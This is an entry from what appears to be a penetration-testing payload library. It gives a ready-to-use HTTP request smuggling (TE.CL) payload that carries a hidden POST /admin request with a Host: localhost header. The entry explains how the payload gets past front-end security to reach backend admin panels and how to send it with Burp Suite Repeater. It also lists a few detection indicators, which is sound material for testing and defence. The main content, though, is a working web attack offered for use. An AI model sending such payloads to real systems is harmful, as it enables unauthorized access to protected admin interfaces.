---
id: 10728be1-ea9b-409a-ba4e-b49e97e53121
type: code
language: http
verified: true
created_at: '2020-08-12T18:51:07.853286+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
tags:
  - http-request-smuggling
  - payload
validated: true
---

# HTTP-Smuggling-TE-CL-Request-with-Host

## Code

```
60
POST /admin HTTP/1.1
Host: localhost
Content-Type:  application/x-www-form-urlencoded
Content-Length: 15 
x=1
0
```

## Description

This enhanced HTTP request smuggling payload builds on the basic TE.CL technique by including a Host header to specify the target server (e.g., localhost). It exploits parsing differences to smuggle a POST /admin request past front-end security, enabling backend access to restricted panels. The chunked structure (60 size, body, 0 termination) desynchronizes front-end and backend interpretation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| /admin | Smuggled endpoint path | /admin |
| Host: localhost | Target host for the request | localhost or target domain |
| x=1 | Form data payload | x=1 |
| 15 | Content-Length of prefix | 15 |
| 60 | Initial chunk size | 60 |

## Usage

Integrate this into intercepted requests via tools like Burp Suite in the Repeater tab. It completes smuggling attacks in procedures such as [[procedures/HTTP-Request-Smuggling-TE-CL-to-Bypass-Front-End-Controls]] by ensuring proper routing to the backend admin interface.

## Detection

- Logs indicating duplicate or mismatched Host headers in chunked requests.
- Front-end proxy errors on Transfer-Encoding with unexpected Content-Length.
- Unauthorized backend hits correlated with front-end 200 OK responses.
